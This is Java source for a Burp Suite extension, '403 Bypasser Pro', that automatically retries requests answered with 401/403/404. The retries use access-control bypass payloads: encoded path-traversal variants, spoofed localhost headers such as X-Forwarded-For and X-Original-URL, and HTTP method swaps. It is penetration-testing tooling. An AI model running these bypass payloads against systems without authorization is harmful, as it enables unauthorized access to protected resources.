package burp;

import javax.swing.*;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableRowSorter;
import java.awt.*;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.nio.file.Files;
import java.util.List;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Pattern;

public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContextMenuFactory {

    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private final String extensionName = "403 Bypasser Pro (旗舰增强版)";

    private JPanel mainPanel;
    private JTabbedPane tabs;

    // --- UI Components ---
    private DefaultTableModel urlTableModel, payloadTableModel;
    private JTable urlTable, payloadTable;
    private IMessageEditor requestViewer, responseViewer;
    private JTable queryTable, headerTable, methodTable, excludeTable, whitelistTable;

    private JCheckBox chkEnableAutoScan, chkEnableWhitelist;
    private JCheckBox chkProxy, chkRepeater, chkIntruder;
    private JCheckBox chkScanQuery, chkScanHeader, chkScanMethod;
    private JTextField txtStatusCodes, txtRegex;
    private JCheckBox chkEnableRegex;

    // --- 高并发数据存储区 ---
    private final List<ScanTask> scanTasks = new CopyOnWriteArrayList<>();
    private final Set<String> dedupCache = ConcurrentHashMap.newKeySet();
    private IHttpRequestResponse currentlyDisplayedItem;
    private final AtomicInteger taskCounter = new AtomicInteger(1);
    private final ExecutorService executor = Executors.newFixedThreadPool(10);
    private File configDir;

    // --- 线程安全的后台读取缓存 ---
    private volatile boolean cAutoScan;
    private volatile boolean cWhitelistOnly;
    private volatile boolean cProxy, cRepeater, cIntruder;
    private volatile boolean cScanQuery, cScanHeader, cScanMethod;
    private volatile String cStatusCodes = "401, 403, 404";
    private volatile boolean cEnableRegex;
    private volatile String cRegexStr = "";
    private volatile List<String> cQueryPayloads = new ArrayList<>();
    private volatile List<String> cHeaderPayloads = new ArrayList<>();
    private volatile List<String> cMethodPayloads = new ArrayList<>();
    private volatile List<String> cExcludeExts = new ArrayList<>();
    private volatile List<String> cWhitelist = new ArrayList<>();

    // --- 默认字典 ---
    private final List<String> defaultQueryPayloads = Arrays.asList(
            "/", "/*", "//", "/./", "/../", "..;/", "/..;/", "/..%3b/", "%3b", ";",
            ";%09", ";%09..", ";%09..;", "%00", "%09", "%20", "%23", "%2e", "%2f",
            "%252e", "%252f", "%2e%2e%2f", "..%2f", ".json", ".xml", ".html",
            "..%00/", "..%0d/", "..%5c", "..%ff/", "%2e%2e%3b/", "*", "/%20"
    );
    private final List<String> defaultHeaderPayloads = Arrays.asList(
            "Client-IP: 127.0.0.1", "X-Real-Ip: 127.0.0.1", "Redirect: 127.0.0.1",
            "Referer: 127.0.0.1", "X-Client-IP: 127.0.0.1", "X-Custom-IP-Authorization: 127.0.0.1",
            "X-Forwarded-By: 127.0.0.1", "X-Forwarded-For: 127.0.0.1", "X-Forwarded-Host: 127.0.0.1",
            "X-Forwarded-Port: 80", "X-True-IP: 127.0.0.1", "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1", "X-Remote-Addr: 127.0.0.1", "X-Host: 127.0.0.1",
            "X-Original-URL: /", "X-Rewrite-URL: /"
    );
    private final List<String> defaultMethodPayloads = Arrays.asList(
            "GET -> POST", "POST -> GET", "HTTP/1.1 -> HTTP/1.0",
            "GET -> OPTIONS", "GET -> TRACE", "GET -> HEAD"
    );
    private final List<String> defaultExcludeExts = Arrays.asList(
            ".jpg", ".jpeg", ".png", ".gif", ".css", ".js", ".woff", ".woff2", ".ico",
            ".svg", ".ttf", ".eot", ".mp4", ".mp3", ".avi", ".ts"
    );
    private final List<String> defaultWhitelist = Arrays.asList("cnzz.com", "example");

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName(extensionName);

        String userHome = System.getProperty("user.home");
        configDir = new File(userHome, ".403bypasser");
        if (!configDir.exists()) { configDir.mkdirs(); }

        SwingUtilities.invokeLater(this::initUI);

        callbacks.registerHttpListener(this);
        callbacks.registerContextMenuFactory(this);
    }

    private void initUI() {
        mainPanel = new JPanel(new BorderLayout());
        tabs = new JTabbedPane();

        // ====== 1. Dashboard ======
        JPanel dashboardPanel = new JPanel(new BorderLayout());
        JSplitPane rootSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        JSplitPane dataSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        JSplitPane topSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);

        // --- URL Table ---
        urlTableModel = new DefaultTableModel(new String[]{"#", "方法", "URL", "原始 Body 长度"}, 0) {
            @Override public Class<?> getColumnClass(int column) { return (column == 0 || column == 3) ? Integer.class : String.class; }
            @Override public boolean isCellEditable(int row, int column) { return false; }
        };
        urlTable = new JTable(urlTableModel);
        urlTable.setRowSorter(new TableRowSorter<>(urlTableModel));
        urlTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        urlTable.getSelectionModel().addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                payloadTableModel.setRowCount(0);
                int viewRow = urlTable.getSelectedRow();
                if (viewRow != -1) {
                    int modelRow = urlTable.convertRowIndexToModel(viewRow);
                    ScanTask task = scanTasks.get(modelRow);
                    for (PayloadResult pr : task.results) {
                        payloadTableModel.addRow(new Object[]{pr.type, pr.payload, pr.newLen, pr.diff, pr.timeMs, pr.status});
                    }
                }
            }
        });
        urlTable.getColumnModel().getColumn(0).setPreferredWidth(40);
        urlTable.getColumnModel().getColumn(1).setPreferredWidth(60);
        urlTable.getColumnModel().getColumn(2).setPreferredWidth(300);

        JPanel urlPanel = new JPanel(new BorderLayout(0, 5));
        JLabel lblScanned = new JLabel(" 已扫描接口 (Scanned Interfaces)");
        lblScanned.setFont(lblScanned.getFont().deriveFont(Font.BOLD));
        urlPanel.add(lblScanned, BorderLayout.NORTH);
        urlPanel.add(new JScrollPane(urlTable), BorderLayout.CENTER);

        // --- Payload Table ---
        payloadTableModel = new DefaultTableModel(new String[]{"类型", "Payload", "新 Body 长度", "差异 (Diff)", "用时 (ms)", "状态码"}, 0) {
            @Override public Class<?> getColumnClass(int column) { return column >= 2 ? Integer.class : String.class; }
            @Override public boolean isCellEditable(int row, int column) { return false; }
        };
        payloadTable = new JTable(payloadTableModel);
        payloadTable.setRowSorter(new TableRowSorter<>(payloadTableModel));

        DefaultTableCellRenderer diffRenderer = new DefaultTableCellRenderer() {
            @Override protected void setValue(Object value) {
                if (value instanceof Integer) {
                    int diff = (Integer) value;
                    setText(diff > 0 ? "+" + diff : String.valueOf(diff));
                    if(diff != 0) {
                        setForeground(new Color(200, 50, 50));
                        setFont(getFont().deriveFont(Font.BOLD));
                    } else {
                        setForeground(Color.BLACK);
                        setFont(getFont().deriveFont(Font.PLAIN));
                    }
                } else { super.setValue(value); }
            }
        };
        payloadTable.getColumnModel().getColumn(3).setCellRenderer(diffRenderer);

        payloadTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        payloadTable.getSelectionModel().addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                int uRow = urlTable.getSelectedRow();
                int pRow = payloadTable.getSelectedRow();
                if (uRow != -1 && pRow != -1) {
                    ScanTask task = scanTasks.get(urlTable.convertRowIndexToModel(uRow));
                    PayloadResult pr = task.results.get(payloadTable.convertRowIndexToModel(pRow));
                    currentlyDisplayedItem = pr.reqRes;
                    requestViewer.setMessage(pr.reqRes.getRequest(), true);
                    if(pr.reqRes.getResponse() != null) {
                        responseViewer.setMessage(pr.reqRes.getResponse(), false);
                    } else {
                        responseViewer.setMessage(new byte[0], false);
                    }
                }
            }
        });
        payloadTable.getColumnModel().getColumn(1).setPreferredWidth(200);

        JPanel payloadPanel = new JPanel(new BorderLayout(0, 5));
        JLabel lblPayload = new JLabel(" 测试结果 (Payload Results)");
        lblPayload.setFont(lblPayload.getFont().deriveFont(Font.BOLD));
        payloadPanel.add(lblPayload, BorderLayout.NORTH);
        payloadPanel.add(new JScrollPane(payloadTable), BorderLayout.CENTER);

        topSplit.setLeftComponent(urlPanel);
        topSplit.setRightComponent(payloadPanel);
        topSplit.setResizeWeight(0.4);

        // Viewers
        JSplitPane viewerSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        IMessageEditorController controller = new IMessageEditorController() {
            public IHttpService getHttpService() { return currentlyDisplayedItem != null ? currentlyDisplayedItem.getHttpService() : null; }
            public byte[] getRequest() { return currentlyDisplayedItem != null ? currentlyDisplayedItem.getRequest() : null; }
            public byte[] getResponse() { return currentlyDisplayedItem != null ? currentlyDisplayedItem.getResponse() : null; }
        };
        requestViewer = callbacks.createMessageEditor(controller, false);
        responseViewer = callbacks.createMessageEditor(controller, false);

        JPanel reqPanel = new JPanel(new BorderLayout(0, 5));
        JLabel lblReq = new JLabel(" 请求包 (Request)");
        lblReq.setFont(lblReq.getFont().deriveFont(Font.BOLD));
        reqPanel.add(lblReq, BorderLayout.NORTH);
        reqPanel.add(requestViewer.getComponent(), BorderLayout.CENTER);

        JPanel resPanel = new JPanel(new BorderLayout(0, 5));
        JLabel lblRes = new JLabel(" 响应包 (Response)");
        lblRes.setFont(lblRes.getFont().deriveFont(Font.BOLD));
        resPanel.add(lblRes, BorderLayout.NORTH);
        resPanel.add(responseViewer.getComponent(), BorderLayout.CENTER);

        viewerSplit.setLeftComponent(reqPanel);
        viewerSplit.setRightComponent(resPanel);
        viewerSplit.setResizeWeight(0.5);

        dataSplit.setTopComponent(topSplit);
        dataSplit.setBottomComponent(viewerSplit);
        dataSplit.setResizeWeight(0.5);

        // --- Control Panel ---
        JPanel ctrlPanel = new JPanel();
        ctrlPanel.setLayout(new BoxLayout(ctrlPanel, BoxLayout.Y_AXIS));
        ctrlPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JLabel lblCtrlTitle = new JLabel("▼ 1. 全局开关 (必须开启)");
        lblCtrlTitle.setFont(lblCtrlTitle.getFont().deriveFont(Font.BOLD, 13f));
        ctrlPanel.add(lblCtrlTitle);
        chkEnableAutoScan = new JCheckBox("允许插件后台监听并扫描流量", false);
        chkEnableAutoScan.setForeground(new Color(200, 0, 0));
        ctrlPanel.add(chkEnableAutoScan);
        ctrlPanel.add(Box.createVerticalStrut(15));

        JLabel lblFilter = new JLabel("▼ 2. 目标白名单过滤");
        lblFilter.setFont(lblFilter.getFont().deriveFont(Font.BOLD, 13f));
        ctrlPanel.add(lblFilter);
        chkEnableWhitelist = new JCheckBox("仅扫描白名单内域名 (强烈推荐)", false);
        ctrlPanel.add(chkEnableWhitelist);
        ctrlPanel.add(Box.createVerticalStrut(15));

        JLabel lblMon = new JLabel("▼ 3. 抓取模块来源");
        lblMon.setFont(lblMon.getFont().deriveFont(Font.BOLD, 13f));
        ctrlPanel.add(lblMon);
        chkProxy = new JCheckBox("代理 (Proxy)", true); ctrlPanel.add(chkProxy);
        chkRepeater = new JCheckBox("重放器 (Repeater)", true); ctrlPanel.add(chkRepeater);
        chkIntruder = new JCheckBox("Intruder", false); ctrlPanel.add(chkIntruder);
        ctrlPanel.add(Box.createVerticalStrut(15));

        JLabel lblEnabled = new JLabel("▼ 4. 启用的扫描方式");
        lblEnabled.setFont(lblEnabled.getFont().deriveFont(Font.BOLD, 13f));
        ctrlPanel.add(lblEnabled);
        chkScanQuery = new JCheckBox("路径字典 (Query)", true); ctrlPanel.add(chkScanQuery);
        chkScanHeader = new JCheckBox("请求头字典 (Header)", true); ctrlPanel.add(chkScanHeader);
        chkScanMethod = new JCheckBox("动词转换 (Method)", true); ctrlPanel.add(chkScanMethod);
        ctrlPanel.add(Box.createVerticalStrut(15));

        JLabel lblTrig = new JLabel("▼ 5. 触发条件 (命中才扫)");
        lblTrig.setFont(lblTrig.getFont().deriveFont(Font.BOLD, 13f));
        ctrlPanel.add(lblTrig);
        ctrlPanel.add(new JLabel("目标状态码 (用逗号分隔):"));
        txtStatusCodes = new JTextField("401, 403, 404"); txtStatusCodes.setMaximumSize(new Dimension(250, 30)); ctrlPanel.add(txtStatusCodes);
        ctrlPanel.add(Box.createVerticalStrut(10));
        chkEnableRegex = new JCheckBox("启用响应包正则匹配 (查漏网之鱼)", true); ctrlPanel.add(chkEnableRegex);
        ctrlPanel.add(new JLabel("提取正则表达式:"));
        txtRegex = new JTextField("(?i)(未授权|access denied|unauthorized|invalid token|expired|not login|权限不足|forbidden|block|waf|illegal|拦截)");
        txtRegex.setMaximumSize(new Dimension(250, 30)); ctrlPanel.add(txtRegex);
        ctrlPanel.add(Box.createVerticalStrut(20));

        JLabel lblData = new JLabel("▼ 6. 数据管理");
        lblData.setFont(lblData.getFont().deriveFont(Font.BOLD, 13f));
        ctrlPanel.add(lblData);
        JButton btnClearCache = new JButton("清空去重缓存 (可重新扫老接口)");
        btnClearCache.addActionListener(e -> {
            dedupCache.clear();
            callbacks.printOutput("[*] 去重缓存已清空，重新发包即可再次扫描！");
        });
        ctrlPanel.add(btnClearCache);
        ctrlPanel.add(Box.createVerticalStrut(5));

        JButton btnClearData = new JButton("清空所有扫描数据列表");
        btnClearData.addActionListener(e -> {
            scanTasks.clear();
            urlTableModel.setRowCount(0);
            payloadTableModel.setRowCount(0);
            requestViewer.setMessage(new byte[0], true);
            responseViewer.setMessage(new byte[0], false);
            dedupCache.clear();
            taskCounter.set(1);
        });
        ctrlPanel.add(btnClearData);

        rootSplit.setLeftComponent(dataSplit);
        rootSplit.setRightComponent(ctrlPanel);
        rootSplit.setResizeWeight(0.85);
        dashboardPanel.add(rootSplit, BorderLayout.CENTER);

        // ====== 2. Config Panel ======
        JPanel configPanel = new JPanel(new GridLayout(3, 2, 10, 10));
        queryTable = buildConfigModule(configPanel, "路径/参数字典 (Query)", "bypasser_query.txt", defaultQueryPayloads);
        headerTable = buildConfigModule(configPanel, "请求头字典 (Header)", "bypasser_header.txt", defaultHeaderPayloads);
        methodTable = buildConfigModule(configPanel, "请求方法转换 (Method: A -> B)", "bypasser_method.txt", defaultMethodPayloads);
        excludeTable = buildConfigModule(configPanel, "排除后缀 (Exclude)", "bypasser_ext.txt", defaultExcludeExts);
        whitelistTable = buildConfigModule(configPanel, "域名白名单关键字 (Whitelist)", "bypasser_whitelist.txt", defaultWhitelist);

        tabs.addTab("扫描大盘 (Dashboard)", dashboardPanel);
        tabs.addTab("配置中心 (Configuration)", configPanel);

        JPanel bottomInfoPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        JLabel infoLabel = new JLabel(" 配置文件保存在: " + configDir.getAbsolutePath() + " | (请随时查看 Extender -> Output 控制台获取丢包原因日志)");
        infoLabel.setForeground(Color.GRAY);
        bottomInfoPanel.add(infoLabel);

        mainPanel.add(tabs, BorderLayout.CENTER);
        mainPanel.add(bottomInfoPanel, BorderLayout.SOUTH);

        callbacks.addSuiteTab(this);

        updateCachesFromUI();
        setupCacheSyncListeners();
    }

    private void setupCacheSyncListeners() {
        ActionListener syncAction = e -> updateCachesFromUI();
        chkEnableAutoScan.addActionListener(syncAction);
        chkEnableWhitelist.addActionListener(syncAction);
        chkProxy.addActionListener(syncAction);
        chkRepeater.addActionListener(syncAction);
        chkIntruder.addActionListener(syncAction);
        chkScanQuery.addActionListener(syncAction);
        chkScanHeader.addActionListener(syncAction);
        chkScanMethod.addActionListener(syncAction);
        chkEnableRegex.addActionListener(syncAction);

        DocumentListener docSync = new DocumentListener() {
            @Override public void insertUpdate(DocumentEvent e) { updateCachesFromUI(); }
            @Override public void removeUpdate(DocumentEvent e) { updateCachesFromUI(); }
            @Override public void changedUpdate(DocumentEvent e) { updateCachesFromUI(); }
        };
        txtStatusCodes.getDocument().addDocumentListener(docSync);
        txtRegex.getDocument().addDocumentListener(docSync);
    }

    private void updateCachesFromUI() {
        SwingUtilities.invokeLater(() -> {
            // 核心修复：强制取消所有表格的闪烁编辑状态，确保刚刚修改的 cnzz 被保存到内存
            if (whitelistTable.isEditing()) whitelistTable.getCellEditor().stopCellEditing();
            if (queryTable.isEditing()) queryTable.getCellEditor().stopCellEditing();
            if (headerTable.isEditing()) headerTable.getCellEditor().stopCellEditing();
            if (methodTable.isEditing()) methodTable.getCellEditor().stopCellEditing();
            if (excludeTable.isEditing()) excludeTable.getCellEditor().stopCellEditing();

            cAutoScan = chkEnableAutoScan.isSelected();
            cWhitelistOnly = chkEnableWhitelist.isSelected();
            cProxy = chkProxy.isSelected();
            cRepeater = chkRepeater.isSelected();
            cIntruder = chkIntruder.isSelected();
            cScanQuery = chkScanQuery.isSelected();
            cScanHeader = chkScanHeader.isSelected();
            cScanMethod = chkScanMethod.isSelected();
            cStatusCodes = txtStatusCodes.getText();
            cEnableRegex = chkEnableRegex.isSelected();
            cRegexStr = txtRegex.getText();

            cQueryPayloads = new ArrayList<>(getTableData(queryTable));
            cHeaderPayloads = new ArrayList<>(getTableData(headerTable));
            cMethodPayloads = new ArrayList<>(getTableData(methodTable));
            cExcludeExts = new ArrayList<>(getTableData(excludeTable));
            cWhitelist = new ArrayList<>(getTableData(whitelistTable));
        });
    }

    private JTable buildConfigModule(JPanel parent, String title, String filename, List<String> defaultData) {
        JPanel panel = new JPanel(new BorderLayout(5, 5));
        JLabel lblTitle = new JLabel(title);
        lblTitle.setFont(lblTitle.getFont().deriveFont(Font.BOLD));
        panel.add(lblTitle, BorderLayout.NORTH);

        File file = new File(configDir, filename);
        List<String> data = defaultData;
        if (!file.exists()) {
            try { Files.write(file.toPath(), defaultData); } catch (IOException ignored) {}
        } else {
            try { data = Files.readAllLines(file.toPath()); } catch (IOException ignored) {}
        }

        DefaultTableModel model = new DefaultTableModel(new String[]{title}, 0);
        for (String item : data) { if (!item.trim().isEmpty()) model.addRow(new Object[]{item.trim()}); }
        JTable table = new JTable(model);

        // 当发生任何修改时（含双击修改），自动写文件并更新内存
        model.addTableModelListener(e -> saveConfig(table, file));

        panel.add(new JScrollPane(table), BorderLayout.CENTER);

        JPanel bot = new JPanel(new BorderLayout(5, 5));
        JTextField txt = new JTextField();
        JPanel btns = new JPanel(new GridLayout(1, 3, 5, 5));

        JButton btnAdd = new JButton("添加");
        btnAdd.addActionListener(e -> {
            if (!txt.getText().isEmpty()) {
                model.addRow(new Object[]{txt.getText()});
                txt.setText("");
            }
        });
        txt.addActionListener(e -> btnAdd.doClick()); // 回车一键添加

        JButton btnClear = new JButton("清空");
        btnClear.addActionListener(e -> model.setRowCount(0));

        JButton btnRemove = new JButton("删除");
        btnRemove.addActionListener(e -> {
            int[] rows = table.getSelectedRows();
            for (int i = rows.length - 1; i >= 0; i--) { model.removeRow(rows[i]); }
        });

        btns.add(btnAdd); btns.add(btnClear); btns.add(btnRemove);
        bot.add(txt, BorderLayout.CENTER); bot.add(btns, BorderLayout.SOUTH);
        panel.add(bot, BorderLayout.SOUTH);

        parent.add(panel);
        return table;
    }

    private void saveConfig(JTable table, File file) {
        try {
            List<String> lines = new ArrayList<>();
            for (int i = 0; i < table.getRowCount(); i++) {
                lines.add(table.getValueAt(i, 0).toString());
            }
            Files.write(file.toPath(), lines);
        } catch (IOException e) {
            callbacks.printError("文件写入失败: " + e.getMessage());
        } finally {
            updateCachesFromUI(); // 确保不管写文件成不成功，内存必须同步
        }
    }

    private List<String> getTableData(JTable table) {
        List<String> list = new ArrayList<>();
        for (int i = 0; i < table.getRowCount(); i++) list.add(table.getValueAt(i, 0).toString());
        return list;
    }

    // 净化关键字，防止带有 HTTP 或 /* 导致匹配失败
    private String cleanKeyword(String kw) {
        String s = kw.trim().toLowerCase();
        s = s.replace("http://", "").replace("https://", "");
        if (s.startsWith("*.")) s = s.substring(2);
        if (s.startsWith("*")) s = s.substring(1);
        if (s.endsWith("/")) s = s.substring(0, s.length() - 1);
        return s;
    }

    private boolean isExcluded(URL url) {
        if(url.getPath() == null) return false;
        String path = url.getPath().toLowerCase();
        for (String ext : cExcludeExts) {
            String cleanExt = ext.trim().toLowerCase();
            if (!cleanExt.isEmpty() && path.endsWith(cleanExt)) return true;
        }
        return false;
    }

    private boolean isWhitelisted(URL url) {
        if (!cWhitelistOnly) return true; // 未开启白名单时，全局放行
        if (url == null || url.getHost() == null) return false;

        String host = url.getHost().toLowerCase();
        for (String kw : cWhitelist) {
            String cleanKw = cleanKeyword(kw);
            // 只要域名包含该干净的关键字即可 (如 z12.cnzz.com 包含 cnzz)
            if (!cleanKw.isEmpty() && host.contains(cleanKw)) {
                return true;
            }
        }
        // 如果没匹配到，向控制台打印原因，方便排查
        callbacks.printOutput("[-] 丢弃 (白名单未匹配): Host [" + host + "] 不包含你配置的任意关键字");
        return false;
    }

    private int getBodyLength(byte[] response) {
        if (response == null) return 0;
        try {
            String respStr = helpers.bytesToString(response);
            String[] parts = respStr.split("\r\n\r\n", 2);
            if (parts.length == 2) {
                return parts[1].length();
            } else {
                return 0;
            }
        } catch (Exception e) {
            return 0;
        }
    }

    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (messageIsRequest || !cAutoScan) return; // 没开启主开关直接退出

        boolean isProxy = (toolFlag == IBurpExtenderCallbacks.TOOL_PROXY);
        boolean isRepeater = (toolFlag == IBurpExtenderCallbacks.TOOL_REPEATER);
        boolean isIntruder = (toolFlag == IBurpExtenderCallbacks.TOOL_INTRUDER);

        if (!(isProxy && cProxy || isRepeater && cRepeater || isIntruder && cIntruder)) return;

        byte[] response = messageInfo.getResponse();
        if (response == null) return;

        IResponseInfo info = helpers.analyzeResponse(response);
        int statusCode = info.getStatusCode();
        boolean matched = false;

        String[] targetCodes = cStatusCodes.split(",");
        for (String code : targetCodes) {
            if (String.valueOf(statusCode).equals(code.trim())) { matched = true; break; }
        }

        if (!matched && cEnableRegex) {
            String regex = cRegexStr.trim();
            if (!regex.isEmpty()) {
                byte[] body = Arrays.copyOfRange(response, info.getBodyOffset(), response.length);
                String bodyStr = helpers.bytesToString(body);
                if (Pattern.compile(regex, Pattern.CASE_INSENSITIVE).matcher(bodyStr).find()) matched = true;
            }
        }

        if (matched) {
            IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo);
            URL url = reqInfo.getUrl();
            String dedupKey = reqInfo.getMethod() + "_" + url.getHost() + url.getPath();

            if (isExcluded(url)) {
                callbacks.printOutput("[-] 丢弃 (黑名单后缀): " + url.getPath());
                return;
            }
            if (!isWhitelisted(url)) {
                return; // isWhitelisted 内部已经打印过日志了
            }
            if (dedupCache.contains(dedupKey)) {
                // 去重丢弃，不打印，防止刷屏
                return;
            }

            dedupCache.add(dedupKey);

            List<String> modes = new ArrayList<>();
            if (cScanQuery) modes.add("query");
            if (cScanHeader) modes.add("header");
            if (cScanMethod) modes.add("method");

            if (!modes.isEmpty()) {
                callbacks.printOutput("[+] 触发自动扫描: " + url.toString());
                executor.submit(() -> doScan(messageInfo, modes));
            }
        }
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> list = new ArrayList<>();
        JMenu menu = new JMenu("403 Bypass (主动扫描)");

        JMenuItem itemQuery = new JMenuItem("仅扫描路径字典 (Query)");
        itemQuery.addActionListener(e -> triggerManualScan(invocation, Arrays.asList("query")));

        JMenuItem itemHeader = new JMenuItem("仅扫描请求头字典 (Header)");
        itemHeader.addActionListener(e -> triggerManualScan(invocation, Arrays.asList("header")));

        JMenuItem itemAll = new JMenuItem("全部扫描 (All)");
        itemAll.addActionListener(e -> triggerManualScan(invocation, Arrays.asList("query", "header", "method")));

        menu.add(itemQuery);
        menu.add(itemHeader);
        menu.add(itemAll);
        list.add(menu);
        return list;
    }

    private void triggerManualScan(IContextMenuInvocation invocation, List<String> modes) {
        for (IHttpRequestResponse msg : invocation.getSelectedMessages()) {
            IRequestInfo req = helpers.analyzeRequest(msg);
            dedupCache.add(req.getMethod() + "_" + req.getUrl().getHost() + req.getUrl().getPath());
            callbacks.printOutput("[+] 触发手动强制扫描: " + req.getUrl().toString());
            executor.submit(() -> doScan(msg, modes));
        }
    }

    private void doScan(IHttpRequestResponse baseMsg, List<String> modes) {
        IHttpService service = baseMsg.getHttpService();
        byte[] origReqBytes = baseMsg.getRequest();
        IRequestInfo origReqInfo = helpers.analyzeRequest(service, origReqBytes);

        byte[] origRespBytes = baseMsg.getResponse();
        if (origRespBytes == null) {
            try { origRespBytes = callbacks.makeHttpRequest(service, origReqBytes).getResponse(); } catch (Exception ignored) {}
        }
        int origLen = getBodyLength(origRespBytes);

        ScanTask task = new ScanTask(taskCounter.getAndIncrement(), origReqInfo.getMethod(), origReqInfo.getUrl().toString(), origLen);
        SwingUtilities.invokeLater(new AddTaskRunnable(this, task));

        List<String> baseHeaders = origReqInfo.getHeaders();
        byte[] baseBody = Arrays.copyOfRange(origReqBytes, origReqInfo.getBodyOffset(), origReqBytes.length);
        String path = origReqInfo.getUrl().getPath();
        String query = origReqInfo.getUrl().getQuery();

        if (modes.contains("query")) {
            for (String payload : cQueryPayloads) {
                for (String pTest : generatePermutations(path, payload)) {
                    try {
                        List<String> newHeaders = new ArrayList<>(baseHeaders);
                        String firstLine = newHeaders.get(0);
                        String[] parts = firstLine.split(" ");
                        if (parts.length >= 2) {
                            String newUri = pTest;
                            if (query != null) newUri += "?" + query;
                            newHeaders.set(0, parts[0] + " " + newUri + (parts.length >= 3 ? " " + parts[2] : ""));
                        }

                        byte[] newReq = helpers.buildHttpMessage(newHeaders, baseBody);
                        long start = System.currentTimeMillis();
                        IHttpRequestResponse res = callbacks.makeHttpRequest(service, newReq);
                        long time = System.currentTimeMillis() - start;

                        if (res.getResponse() != null) {
                            int nLen = getBodyLength(res.getResponse());
                            int statusCode = helpers.analyzeResponse(res.getResponse()).getStatusCode();
                            PayloadResult pr = new PayloadResult("Query", pTest.replace(path, "..."), nLen, nLen - origLen, (int)time, statusCode, res);
                            SwingUtilities.invokeLater(new AddPayloadRunnable(this, task, pr));
                        }
                    } catch (Exception ignored) {}
                }
            }
        }

        if (modes.contains("header")) {
            for (String payload : cHeaderPayloads) {
                try {
                    List<String> newHeaders = new ArrayList<>(baseHeaders);
                    String headerKey = payload.split(":")[0].trim().toLowerCase();
                    boolean updated = false;
                    for (int i = 0; i < newHeaders.size(); i++) {
                        if (newHeaders.get(i).toLowerCase().startsWith(headerKey + ":")) {
                            newHeaders.set(i, payload); updated = true; break;
                        }
                    }
                    if (!updated) newHeaders.add(payload);

                    byte[] newReq = helpers.buildHttpMessage(newHeaders, baseBody);
                    long start = System.currentTimeMillis();
                    IHttpRequestResponse res = callbacks.makeHttpRequest(service, newReq);
                    long time = System.currentTimeMillis() - start;

                    if (res.getResponse() != null) {
                        int nLen = getBodyLength(res.getResponse());
                        int statusCode = helpers.analyzeResponse(res.getResponse()).getStatusCode();
                        PayloadResult pr = new PayloadResult("Header", payload, nLen, nLen - origLen, (int)time, statusCode, res);
                        SwingUtilities.invokeLater(new AddPayloadRunnable(this, task, pr));
                    }
                } catch (Exception ignored) {}
            }
        }

        if (modes.contains("method")) {
            for (String payload : cMethodPayloads) {
                if (!payload.contains("->")) continue;
                String[] parts = payload.split("->");
                String from = parts[0].trim();
                String to = parts[1].trim();

                List<String> newHeaders = new ArrayList<>(baseHeaders);
                byte[] newBody = baseBody.clone();
                String firstLine = newHeaders.get(0);

                if (firstLine.contains(from)) {
                    newHeaders.set(0, firstLine.replaceFirst(from, to));

                    if (to.equals("GET") || to.equals("HEAD") || to.equals("OPTIONS")) {
                        newHeaders.removeIf(h -> h.toLowerCase().startsWith("content-length:") || h.toLowerCase().startsWith("content-type:"));
                        newBody = new byte[0];
                    } else if (to.equals("POST") || to.equals("PUT")) {
                        boolean hasCl = newHeaders.stream().anyMatch(h -> h.toLowerCase().startsWith("content-length:"));
                        if (!hasCl) newHeaders.add("Content-Length: " + newBody.length);
                    }

                    try {
                        byte[] newReq = helpers.buildHttpMessage(newHeaders, newBody);
                        long start = System.currentTimeMillis();
                        IHttpRequestResponse res = callbacks.makeHttpRequest(service, newReq);
                        long time = System.currentTimeMillis() - start;

                        if (res.getResponse() != null) {
                            int nLen = getBodyLength(res.getResponse());
                            int statusCode = helpers.analyzeResponse(res.getResponse()).getStatusCode();
                            PayloadResult pr = new PayloadResult("Method", payload, nLen, nLen - origLen, (int)time, statusCode, res);
                            SwingUtilities.invokeLater(new AddPayloadRunnable(this, task, pr));
                        }
                    } catch (Exception ignored) {}
                }
            }
        }
    }

    private List<String> generatePermutations(String path, String payload) {
        List<String> list = new ArrayList<>();
        int index = path.indexOf('/');
        while (index >= 0) {
            list.add(path.substring(0, index) + payload + path.substring(index));
            list.add(path.substring(0, index) + "/" + payload + path.substring(index + 1));
            list.add(path.substring(0, index) + "/" + payload + "/" + path.substring(index + 1));
            index = path.indexOf('/', index + 1);
        }
        list.add(path + "/" + payload);
        list.add(path + "/" + payload + "/");
        return list;
    }

    @Override public String getTabCaption() { return extensionName; }
    @Override public Component getUiComponent() { return mainPanel; }

    class ScanTask {
        int task_id; String method; String url; int orig_len;
        List<PayloadResult> results = new CopyOnWriteArrayList<>();
        ScanTask(int id, String m, String u, int len) { this.task_id = id; this.method = m; this.url = u; this.orig_len = len; }
    }
    class PayloadResult {
        String type, payload; int newLen, diff, timeMs, status; IHttpRequestResponse reqRes;
        PayloadResult(String t, String p, int nl, int d, int tm, int s, IHttpRequestResponse rr) {
            type = t; payload = p; newLen = nl; diff = d; timeMs = tm; status = s; reqRes = rr;
        }
    }
